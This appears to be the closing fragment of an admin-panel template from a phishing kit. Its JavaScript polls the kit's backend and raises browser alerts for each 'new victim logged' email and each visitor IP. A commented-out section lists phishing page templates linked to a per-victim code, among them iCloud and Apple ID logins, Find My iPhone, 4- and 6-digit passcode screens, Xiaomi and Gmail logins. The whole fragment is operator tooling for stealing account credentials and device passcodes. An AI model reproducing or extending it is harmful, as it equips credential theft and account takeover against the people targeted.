TYCieGTkSTlrB5IWtylBNmpipHO4es+8NuIDDTXDSuZ/TeUMG38VlfIUp6lNr2K64YxYtKuu9vWgnVYYvh3AmtYWhkAuzZFdVXXTdvF8z/ACcq+OUeVHlcouXNqcK96lSOe1Gq0RV1Pp0tK6QiQ86x0ANdFS6xeOm2sF0qK5KiWw1ejoe2EBInYjR6hTPBRuKLRuFuJyWn8PdnJGdOhaflLVwcPjG5PFNdeZRNKLFtGOoNGzXvPuuu3bOHBlut43darqernNM4tqbmLxmRG+SSF5XLaipqN9eBaFBYAdlKRcZ1jmy+5YtUtyEqbWmrqmXzW4sm5Dzfn80llJaMOoYPcqEB1bdwk1wmppOVWMmBtZNABqySSwWdX1igWwfjnQQkWuSV52I2hgT6/GOXsZTLZiBpJUjGAurasKvA1NorNnKJrFWqs2ucALFOI3TDUSRe2pNldb9+/qGnqCrNWK7V26rgeg4SRVmLmTTYgj+67O0STWLDPvF3pXxFPEpqgwtqtLXppOC2S222rtJLMutMnbu3c7zAbozgMFlhptXmhpgO0UIq9K0+KGUm1pQ9F9pHcL95w9mHksRdyI20jmE06d2rNR9QtG6ayzDryqRITymQgckyIabblQSPjjbjPJx/YeIOGrmpbVyorHbEjWUiuskmf2yhkR5IuXYkJONzVz7RjusokJkSJVh6B0e2rLWlf8Jaaqb3fd+l23V75yeRKQl5b/x8oA5pxIB8rvZMvGk1gUU3SaKmoswDFJkAJa8DeIFT0NXoWMfaTm6CW4rF/wAPQE/xromypFOWg4zmvZdKW5BphEuzDUty9mCNdi8YNYPUtXHVlNW0LdiTVLCCDxqriplvMThirV2UuCBccqBosBRwqUgBJSxQ6OX86hWrwL1y4sYOEwoxYqS+anmzb41pn5sG0bnJxoSgxFh0llCX2kk0TQLfazhhPdipm4Y7LQi3D5AGNOtqTDwbk+Ox4/if8eVHOR4jcf2mNTWOTWFGw+gIGxg+E1lWICuwl9bTKDTK149if/WuFNMsZSqHATVmlIoFTnRU3QZwZVSUTWT5JzNj+6I8vo/FbEsLq1f5t0XDggYqxL7Ef5Md96IOpssggyuQ2Om9LtzWtnWRkpXiovsWMLO8KmIDQgvIy0GAfOPoX6FhTpzVJqwUFZyK+htG4abFUXHZ8Xz8RSRkK1aLTDtSFZscnEbJjm1h9T47DHSICG04hhcJIGhDYJUON/GWNNrYmWMKe6O75CAT3e2tMD//2Q==',
                timeout: 10000,
                onClick: function () {
                    window.focus();
                    this.close();
                    location.href = url;
                },
                vibrate: [200, 100]
            });
        }


        function visitor() {
            $.ajax({
                cache: false,
                type: "GET",
                timeout: 5000,
                dataType: 'json',
                url: '{{site_url(ADMINPATH.'api/getVNoti')}}',
                success: function (res) {
                    if (res.message) {
                        pushN('You have new visitor IP ' + res.message + ' click for details.', '{{site_url(ADMINPATH.'visitor')}}');
                    }
                },
                error: function () {
                    return false;
                }
            });
        }

        function victims() {
            $.ajax({
                cache: false,
                type: "GET",
                timeout: 10000,
                dataType: 'json',
                url: '{{site_url(ADMINPATH.'api/getNoti')}}',
                success: function (res) {
                    if (res.message) {
                        var msg = res.message;
                        var num = '1';
                        jQuery.each(msg, function (index, item) {

                            if (num > 1) {
                                window.setTimeout(function () {
                                    pushN('New victim logged "' + item.email + '" click for details.', '{{site_url(ADMINPATH.'victims/details/')}}' + item.id + '/' + item.email);
                                }, num + '999');
                            } else {
                                window.setTimeout(function () {
                                    pushN('New victim logged "' + item.email + '" click for details.', '{{site_url(ADMINPATH.'victims/details/')}}' + item.id + '/' + item.email);
                                }, num + '00');
                            }


                            num++;
                        });
                    }
                },
                error: function () {
                    return false;
                }
            });
        }

        window.setInterval(victims, 1000000);
        window.setInterval(visitor, 600000);

    });

/*
    function funcaoListaLinks(val){

        var html = 'Código: <strong>' + val + '</strong> </br> <p> . </p>' +
                    '<a target="_blank" href="{{$icloud}}/' + val + '"> iCloud Login</a></br>' +
                    '<a target="_blank" href="{{$aid}}/' + val + '"> AppleID Login</a></br>' +
                    '<a target="_blank" href="{{$passwd}}/' + val + '"> Reset Password</a></br>' +
                    '<a target="_blank" href="{{$fmi}}/' + val + '"> Find My iPhone</a></br>' +
                    '<a target="_blank" href="{{$ffmi}}/' + val + '"> Find My iPhone v2 "Compass" </a></br>' +
                    '<a target="_blank" href="{{$map}}/' + val + '"> Mapas Connect</a></br>' +
                    '<a target="_blank" href="{{$bolinha}}/' + val + '"> Bolinha 6 Digitos</a></br>' +
                    '<a target="_blank" href="{{$bolinha4}}/' + val + '"> Bolinha 4 Digitos</a></br>' +
                    '<a target="_blank" href="{{$MapaNovo}}/' + val + '"> Mapa Novo 4 Digitos</a></br>' +
                    '<a target="_blank" href="{{$MapaNovo6}}/' + val + '"> Mapa Novo 6 Digitos</a></br>' +
                    '<a target="_blank" href="{{$MapaNovoLogin}}/' + val + '"> Mapa Novo Somente Login</a></br>' +
                    '<a target="_blank" href="{{$Map2020Modelo1}}/' + val + '"> Mapa 2020 Modelo 1</a></br>' +
                    '<a target="_blank" href="{{$Map2020Modelo2}}/' + val + '"> Mapa 2020 Modelo 2</a></br>' +
                    '<a target="_blank" href="{{$SenhaTela4Modelo2020}}/' + val + '"> Senha 4 Digitos Modelo 2020</a></br>' +
                    '<a target="_blank" href="{{$SenhaTela6Modelo2020}}/' + val + '"> Senha 6 Digitos Modelo 2020</a></br>' +
                    '<a target="_blank" href="{{$XiaomiLogin}}/' + val + '"> Xiaomi Login</a></br>' +
                    '<a target="_blank" href="{{$gmail2020}}/' + val + '"> Gmail Login</a>';
                swal({
                    title: "Lista de Templates!",
                    text: html,
                    html: true,
                    type: 'success',
                    animation: "slide-from-top",
                    confirmButtonText: 'Copiado? Clique para Fechar!',
                });

    }

    function funcaoAlteraCodigo(val){


    swal({
                title: "Editar Código Link Único",
                text: "Você pode inserir um código personalizado",
                type: "input",
                showCancelButton: true,
                showConfirmButton: true,
                closeOnCancel: false,
                closeOnConfirm: false,
                confirmButtonText: 'Salvar',
                animation: "slide-from-top",
                inputPlaceholder: "Código Personalizado Aqui.",
                inputValue: val,
                html: true,
            }, function (inputValue) {

                if (inputValue !== false) {
                    if(inputValue != ''){
                        $.ajax({
                            cache: false,
                            type: "GET",
                            dataType: 'json',
                            timeout: 5000,
                            url: '{{site_url('admin/links/editLink/')}}' + inputValue + '@ESPACO123456ESPACO@' + val,
                            success: function (res) {
                                if (res.message) {
                                    console.log(res);
                                    var html = 'Link Alterado';

                                    swal({
                                         title: "Link Alterado!",
                                        text: html,
                                        html: true,
                                        type: 'success',
                                        animation: "slide-from-top",
                                        confirmButtonText: 'Clique para Fechar!',
                                     },
                                     function(isConfirm){

                                       if (isConfirm){
                                         console.log("Confirmado");
                                         location.reload();

                                        }
                                     });

                                } else {
                                    swal("Oops!", res.error + "<br />Something goes wrong try again!", "error");
                                }
                            },
                            error: function () {
                                swal("Oops!", "Algo deu errado, tente novamente. Talvez você esteja tentando colocar um Código que já exista!", "error");
                            }
                        });
                    } else {
                        swal("Cancelado!", "Campo OBRIGATÓRIO!", "error");
                    }
                } else {
                    swal("Cancelado!", "Tudo bem, eu só queria ajudá-lo ;(", "error");
                }

            });




    }
    */
</script>
@endif
</body>
<?php
//$query = $this->db->get($this->'admins')->result_array();

        ?>
</html>
